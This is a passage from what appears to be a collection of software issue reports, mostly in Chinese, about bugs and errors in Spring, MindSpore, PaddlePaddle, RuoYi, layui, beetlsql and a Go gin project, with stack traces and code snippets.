org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:122) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:109) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:354) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:267) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280) at java.lang.Thread.run(Thread.java:745) Caused by: java.sql.SQLIntegrityConstraintViolationException: Duplicate entry '0' for key 'PRIMARY' at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:117) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:953) at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:371) at com.zaxxer.hikari.pool.ProxyPreparedStatement.execute(ProxyPreparedStatement.java:44) at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.execute(HikariProxyPreparedStatement.java) at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:47) at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:74) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:64) at com.sun.proxy.$Proxy226.update(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:50) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:76) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:106) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy225.update(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:194) at org.apache.ibatis.session.defaults.DefaultSqlSession.insert(DefaultSqlSession.java:181) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) ... 141 common frames omitted"
[CT][MS][cumulativelogsumexp]GPU平台参数axis缺少支持int16类型,"GPU平台axis缺少支持int16类型 资料显示已支持，CPU平台也支持int16 /mode graph   <code>: Inputs: - **x** (Tensor) - The input tensor. Must be one of the following types: float16, float32, float64. The dimension of `x` must greater than 0. - **axis** (Tensor) - A 0-D tensor describing the dimension to compute the cumulative product. Must be one of the following types: int64, int32, int16. Must be in the range [-rank(x), rank(x)). Default: 0. Outputs: Tensor, has the same dtype and shape as the `x`. Raises: TypeError: If `x` or `axis` not a Tensor. TypeError: If dtype of `x` is not in [float16, float32, float64]. TypeError: If dtype of `axis` is not in [int16, int32, int64]. TypeError: If `exclusive` or `reverse` is not a bool. ValueError: If the dimension of `x` is not greater than 0. RuntimeError: If `axis` is out of range [-rank(x), rank(x)). Supported Platforms: ``Ascend`` ``CPU`` ``Ascend`` ``CPU`` ``GPU`` def test_p_cumulativelogsumexp_random_input_6d_fp32(): input_list = [] x = Tensor(np.random.randn(9, 10, 11, 12, 13, 14).astype(np.float32)) axis = Tensor(np.random.randint(-6, 6), dtype=mstype.int16) input_list.append(x) input_list.append(axis) fact = CumulativeLogsumexpMock(attributes={'exclusive': True, 'reverse': False}, inputs=input_list) &gt; fact.forward_cmp()"
RuoYi-Gateway OutOfDirectMemory,"线上项目运行几个月之后gateway就会出现内存溢出，然后越来越多的请求502.   <code>: 2021-05-29 08:48:11.993 WARN 25714 --- [or-http-epoll-7] r.netty.http.client.HttpClientConnect : [id: 0x242e0425, L:/192.168.0.183:45994 - R:192.168.0.96/192.168.0.96:9209] The connection observed an error reactor.netty.ReactorNetty$InternalNettyException: io.netty.util.internal.OutOfDirectMemoryError: failed to allocate 16777216 byte(s) of direct memory (used: 1895825415, max: 1908932608) Caused by: io.netty.util.internal.OutOfDirectMemoryError: failed to allocate 16777216 byte(s) of direct memory (used: 1895825415, max: 1908932608) at io.netty.util.internal.PlatformDependent.incrementMemoryCounter(PlatformDependent.java:742) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.internal.PlatformDependent.allocateDirectNoCleaner(PlatformDependent.java:697) ~[netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.PoolArena$DirectArena.allocateDirect(PoolArena.java:758) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.PoolArena$DirectArena.newChunk(PoolArena.java:734) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.PoolArena.allocateNormal(PoolArena.java:245) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.PoolArena.allocate(PoolArena.java:227) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.PoolArena.allocate(PoolArena.java:147) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.PooledByteBufAllocator.newDirectBuffer(PooledByteBufAllocator.java:356) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:187) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:178) ~[netty-buffer-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.unix.PreferredDirectByteBufAllocator.ioBuffer(PreferredDirectByteBufAllocator.java:53) ~[netty-transport-native-unix-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.DefaultMaxMessagesRecvByteBufAllocator$MaxMessageHandle.allocate(DefaultMaxMessagesRecvByteBufAllocator.java:114) ~[netty-transport-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.channel.epoll.EpollRecvByteAllocatorHandle.allocate(EpollRecvByteAllocatorHandle.java:75) ~[netty-transport-native-epoll-4.1.48.Final-linux-x86_64.jar!/:4.1.48.Final] at io.netty.channel.epoll.AbstractEpollStreamChannel$EpollStreamUnsafe.epollInReady(AbstractEpollStreamChannel.java:777) ~[netty-transport-native-epoll-4.1.48.Final-linux-x86_64.jar!/:4.1.48.Final] at io.netty.channel.epoll.EpollEventLoop.processReady(EpollEventLoop.java:475) ~[netty-transport-native-epoll-4.1.48.Final-linux-x86_64.jar!/:4.1.48.Final] at io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:378) ~[netty-transport-native-epoll-4.1.48.Final-linux-x86_64.jar!/:4.1.48.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) [netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) [netty-common-4.1.48.Final.jar!/:4.1.48.Final] at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) [netty-common-4.1.48.Final.jar!/:4.1.48.Final] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_261]"
add tensor interfaces,"Add member variable and a getter function . is supposed to hold tensor's shape and it is required by . Remove an overloaded version of which use default . Now users must provide an explicit as parameter when calling . See #2742:Mobilenet gpu implementation. A PlaceHolder may be shared by more than one tensor, and some of them may be the others' slices. So we add a new member variable 'offset_' for Tensor, which is used to show the byte offset between and where tensor's data really begins. Add functions and for Tensor. TODO: Tensor needs a 'CopyFrom' function And there is another question. After , we are going to get a series of tensors which have only dims_ but no data(). So it seems reasonable to add a new interface for these tensors' memory allocation: If not, we have to write:   <code>: DDim dims_ dims() dims_ Op::InferShape mutable_data Place Place mutable_data PlaceHolder::ptr_ ShareDataFrom Slice Op::InferShape holder_ == nullptr T* mutable_data(Place place) { return mutable_data(dims_, place); } float* p = my_tensor.mutable_data&lt;float&gt;(my_tesnor.dims(), CPUPlace());"
关于OnlineWebSessionManager中Session属性修改以后的markAttributeChanged,"OnlineWebSessionManager中的setAttribute方法： 当Session属性修改以后，通过sessionKey获取session并将属性值拷贝到OnlineSession对象中，随后通过markAttributeChanged标记修改状态，但是修改状态没有同步到缓存中的Session里面，当方法执行完OnlineSession对象释放，这个修改就丢失了，这样岂不是没有效果？   <code>: @Override public void setAttribute(SessionKey sessionKey, Object attributeKey, Object value) throws InvalidSessionException { super.setAttribute(sessionKey, attributeKey, value); if (value != null &amp;&amp; needMarkAttributeChanged(attributeKey)) { OnlineSession session = getOnlineSession(sessionKey); session.markAttributeChanged(); } }"
使用训练好的模型作为其他图像分类的预训练要怎么修改模型？,"官方在这里提供了一些训练好的模型：https://github.com/PaddlePaddle/models/tree/develop/fluid/image_classification#supported-models-and-performances 我使用这些模型作为其他类别和图片大小的与训练模型，我参考这里这个代码： https://github.com/PaddlePaddle/models/blob/8f61de12fdd35ce9aa5073263724fad6b73ff8bf/fluid/image_classification/train.py#L147-L152 按照之前的方式使用了ResNet50，把最好的全连接层的文件删除，在运行的时候结果报错： 训练好的模型要怎样修改才能作为自己分类任务的预训练模型？   <code>: *** Aborted at 1533809394 (unix time) try ""date -d @1533809394"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGABRT (@0x4acb) received by PID 19147 (TID 0x7f0eee645700) from PID 19147; stack trace: *** @ 0x7f0eee22c390 (unknown) @ 0x7f0eede86428 gsignal @ 0x7f0eede8802a abort @ 0x7f0eedec87ea (unknown) @ 0x7f0eeded137a (unknown) @ 0x7f0eeded553c cfree @ 0x7f0ec076b472 paddle::framework::details::ThreadedSSAGraphExecutor::Run() @ 0x7f0ec076fca5 paddle::framework::details::ScopeBufferedSSAGraphExecutor::Run() @ 0x7f0ebfb7285d paddle::framework::ParallelExecutor::Run() @ 0x7f0ebfaf41d6 _ZZN8pybind1112cpp_function10initializeIZNS0_C1IvN6paddle9framework16ParallelExecutorEIRKSt6vectorISsSaISsEERKSsEINS_4nameENS_9is_methodENS_7siblingEEEEMT0_FT_DpT1_EDpRKT2_EUlPS5_SA_SC_E_vISQ_SA_SC_EISD_SE_SF_EEEvOSH_PFSG_SJ_ESP_ENUlRNS_6detail13function_callEE1_4_FUNESX_ @ 0x7f0ebfacc604 pybind11::cpp_function::dispatcher() @ 0x4c37ed PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4c16e7 PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4c1e6f PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4eb30f (unknown) @ 0x4e5422 PyRun_FileExFlags @ 0x4e3cd6 PyRun_SimpleFileExFlags @ 0x493ae2 Py_Main @ 0x7f0eede71830 __libc_start_main @ 0x4933e9 _start @ 0x0 (unknown)"
【MindSpore】【Ascend】【C类】【octsqueeze】8p 1p无法执行，train.py脚本错误mian函数报错,"1p无法执行，train.py脚本错误mian函数报错 如下 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: Please delete the backend not involved / 请删除不涉及的后端: /device ascend : --CANN 版本: (CANN 5.0.4.B065) --MindSpore 版本: mindspore 1.6.1 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 Steps to reproduce the issue / 重现步骤 bash run_train_standalone.sh /home/ma-user/work/training_dataset/training_dataset/ Ascend ./ckpt/ 0 Describe the expected behavior / 预期结果 1p可以正常执行 Related log / screenshot / 日志 / 截图   <code>: root@776d29163172:/data1/mwx989155/MindSpore/octsqueeze/scripts# bash run_train_standalone.sh /home/ma-user/work/training_dataset/training_dataset/ Ascend ./ckpt/ 0 Traceback (most recent call last): File ""../train.py"", line 72, in &lt;module&gt; if name == '__main__': NameError: name 'name' is not defined"
在调用capi进行预测时出core,"出core信息如下： 已经检查过了输入数据的格式和维度，暂未定位到问题，请问是否可以帮忙定位一下问题，谢谢 9个input的数据格式如下：   <code>: I0706 16:58:50.860919 25639 Util.cpp:166] commandline: --use_gpu=False I0706 16:58:51.912390 25639 GradientMachine.cpp:83] Loading parameters from ./conf/param F0706 16:58:52.486660 25639 Matrix.cpp:3112] Check failed: index[i] &lt; (int)tableSize (10624912 vs. 1129704) *** Check failure stack trace: *** @ 0x7f69ed5d007d google::LogMessage::Fail() @ 0x7f69ed5d3b2c google::LogMessage::SendToLog() @ 0x7f69ed5cfba3 google::LogMessage::Flush() @ 0x7f69ed5d503e google::LogMessageFatal::~LogMessageFatal() @ 0x7f69ed8d2dda paddle::CpuMatrix::selectRowsImp&lt;&gt;() @ 0x7f69ed8d08c6 paddle::CpuMatrix::selectRows() @ 0x7f69ed6207fa paddle::TableProjection::forward() @ 0x7f69ed67a989 paddle::MixedLayer::forward() @ 0x7f69ed747c2d paddle::NeuralNetwork::forward() @ 0x7f69ed5cb0f6 paddle_gradient_machine_forward @ 0x4499f5 main @ 0x7f69ec9bbbd5 __libc_start_main @ 0x4415b9 (unknown) @ (nil) (unknown) 已放弃 (core dumped) input_0(source_input_0) = paddle.layer.data( name=""source_input_0"", type=paddle.data_type.integer_value_sequence(1129704) input_1(source_input_1) = paddle.layer.data( name=""source_input_1"", type=paddle.data_type.dense_vector_sequence(200)) input_2(source_input_2) = paddle.layer.data( name=""source_input_2"", type=paddle.data_type.integer_value(41)) input_3(source_input_3) = paddle.layer.data( name=""source_input_3"", type=paddle.data_type.integer_value(41)) input_4(source_input_4) = paddle.layer.data( name=""source_input_4"", type=paddle.data_type.integer_value(41)) input_5(source_input_5) = paddle.layer.data( name=""source_input_5"", type=paddle.data_type.integer_value_sequence(10158)) input_6(target_input_0) = paddle.layer.data( name=""target_input_0"", type=paddle.data_type.integer_value_sequence(1129704) input_7(target_input_1) = paddle.layer.data( name=""target_input_1"", type=paddle.data_type.integer_value_sequence(10158)) input_8(target_input_2) = paddle.layer.data( name=""target_input_2"", type=paddle.data_type.dense_vector(6))"
SqlParser格式化group by时不能得到正确的结果,"结果是 预期的应该是这样的 或者   <code>: SELECT count(*) FROM SYS_APPTIME GROUP BY belong_date, action_name select count(distinct belong_date, action_name) from SYS_APPTIME SELECT count(*) from (select 1 FROM SYS_APPTIME GROUP BY belong_date, action_name ) a"
CosSimOp.cpp:54] Check failed: square_sum_x > 0 ,报这个错，请问是为什么呢？该怎么解决呢   <code>: I0820 15:06:07.562870 12349 Util.cpp:166] commandline: --use_gpu=False I0820 15:06:08.136152 12349 GradientMachine.cpp:85] Initing parameters.. I0820 15:06:12.327430 12349 GradientMachine.cpp:92] Init parameters done. F0820 15:06:13.919644 12349 CosSimOp.cpp:54] Check failed: square_sum_x &gt; 0 &amp;&amp; square_sum_y &gt; 0 *** Check failure stack trace: *** @ 0x7ff500468e6d google::LogMessage::Fail() @ 0x7ff50046c91c google::LogMessage::SendToLog() @ 0x7ff500468993 google::LogMessage::Flush() @ 0x7ff50046de2e google::LogMessageFatal::~LogMessageFatal() @ 0x7ff5002e3380 paddle::CosSimForward&lt;&gt;() @ 0x7ff5002e79e1 paddle::CosSimForwardFunc&lt;&gt;::calc() @ 0x7ff500210a86 paddle::CosSimLayer::forward() @ 0x7ff5002cf690 paddle::NeuralNetwork::forward() @ 0x7ff5002ab883 paddle::GradientMachine::forwardBackward() @ 0x7ff5004447ab GradientMachine::forwardBackward() @ 0x7ff50013b38e _wrap_GradientMachine_forwardBackward @ 0x4a9e33 PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4aa88c PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4aa88c PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4aa88c PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4aa88c PyEval_EvalFrameEx @ 0x4ad70d PyEval_EvalCodeEx @ 0x4ad842 PyEval_EvalCode @ 0x4d64c2 PyRun_FileExFlags @ 0x4d7839 PyRun_SimpleFileExFlags @ 0x416edd Py_Main @ 0x7ff5082f6bd5 __libc_start_main @ 0x415f91 (unknown) @ (nil) (unknown) Aborted
layui 分页 下拉选择limit我在table的done方法内重新赋值option内容，之后在选择它的时候还会一闪而过它本来的内容,"以上代码是在table渲染的done方法内，执行重新赋值select的内容，变成纯数字。渲染结束后，我点击选择，会一闪而过它本来的设置的“xxx 条/页”这样的内容，想问原因是啥，有啥方法可以解决这个一闪而过的内容。   <code>: , done: function(res){ $('div[lay-id=""propertyTable""] #layui-table-page2 .layui-laypage-limits ').prepend(""每页"").append(""条"") $('div[lay-id=""propertyTable""] #layui-table-page2 .layui-laypage-limits option').each(function(index, item){ $(this).html('&lt;option value=""'+$(this).text().split("" "")[0]+'""&gt;'+$(this).text().split("" "")[0]+'&lt;/option&gt;') }) }"
beetlsql3.5.0 mysql 遇到表名为order，会出现空格+表名,"beetlsql3.5.0 mysql5.7 表名order,@Table(name=""order"") 使用内置的查询方法，sql如下： select count(*) FROM WHERE = ? AND = ? 表名前，多了个空格。 好像这个问题在beetlsql2有出现过，后来解决了。 现在出现尴尬了   <code>: order username userid"
app/http/core/data_transfer/data_transfer.go里面的DataAddContext函数，为啥不用reflect呢,"比如像这样：   <code>: func DataAddContext(validatorInterface interf.ValidatorInterface, extraAddDataPrefix string, context *gin.Context) *gin.Context { valueOfValidator := reflect.ValueOf(validatorInterface) typeOfValidator := valueOfValidator.Type() if typeOfValidator.Kind() == reflect.Struct { fieldNum := valueOfValidator.NumField() for i := 0; i &lt; fieldNum; i++ { field := valueOfValidator.Field(i) tag := typeOfValidator.Field(i).Tag.Get(""form"") context.Set(extraAddDataPrefix+tag, field.Interface()) } // 此外给上下文追加三个键：created_at 、 updated_at 、 deleted_at ，实际根据需要自己选择获取相关键值 curDateTime := time.Now().Format(variable.DateFormart) context.Set(extraAddDataPrefix+""created_at"", curDateTime) context.Set(extraAddDataPrefix+""updated_at"", curDateTime) context.Set(extraAddDataPrefix+""deleted_at"", curDateTime) return context } return nil }"
Linux安装错误 dlopen: cannot load any more object with static TLS,"Info Output of : Installation installed by pip: outpt of : Error Debug I've tried to compile the with according to this suggestion and add it to : .   <code>: python summary_env.py /yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/fluid/core.py:189: UserWarning: Load /usr/lib64/libgomp.so.1 failed warnings.warn(""Load {} failed"".format(dso_absolute_path)) summary_env.py:50: DeprecationWarning: dist() and linux_distribution() functions are deprecated in Python 3.5 plat = platform.linux_distribution()[0] summary_env.py:51: DeprecationWarning: dist() and linux_distribution() functions are deprecated in Python 3.5 ver = platform.linux_distribution()[1] Paddle version: None Paddle With CUDA: None OS: SUSE Linux Enterprise Server 11 Python version: 3.7.8 CUDA version: None cuDNN version: None.None.None Nvidia driver version: None pip install paddlepaddle -i https://mirror.baidu.com/pypi/simple conda list paddle # packages in environment at /yin_raid/xin/miniconda3/envs/paddle_dev: # # Name Version Build Channel paddlepaddle 1.8.4 pypi_0 pypi (paddle_dev) zhangxin@admin:~/softwares/glibc-2.18&gt; python Python 3.7.8 | packaged by conda-forge | (default, Jul 31 2020, 02:25:08) [GCC 7.5.0] on linux Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. &gt;&gt;&gt; import paddle /yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/fluid/core.py:189: UserWarnin warnings.warn(""Load {} failed"".format(dso_absolute_path)) Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/__init__.py"", line 37 import paddle.complex File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/complex/__init__.py"", from . import tensor File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/complex/tensor/__init from . import math File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/complex/tensor/math.p from paddle.common_ops_import import * File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/common_ops_import.py"" from paddle.fluid.layer_helper import LayerHelper File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/fluid/__init__.py"", l from . import framework File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/fluid/framework.py"", from . import core File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/fluid/core.py"", line raise e File ""/yin_raid/xin/miniconda3/envs/paddle_dev/lib/python3.7/site-packages/paddle/fluid/core.py"", line from .core_avx import * ImportError: dlopen: cannot load any more object with static TLS glibc 2.18 DTV_SURPLUS=32 LD_LIBRARY_PATH export LD_LIBRARY_PATH=/public/home/zhangxin/softwares/glibc-2.18:$LD_LIBRARY_PATH"
Permission deniedmake Error1,"when I install paddle on centos7, I use sudo make -j &amp;&amp; make install ,there is an error: Generating ../../paddle/python/paddle/proto/ParameterServerConfig_pb2.py /my work path/paddle/python/paddle/proto/ParameterServerConfig_pb2.py: Permission deniedmake[2]: *** [../paddle/python/paddle/proto/ParameterServerConfig_pb2.py] Error 1 I must use root to install.   <code>: nproc"
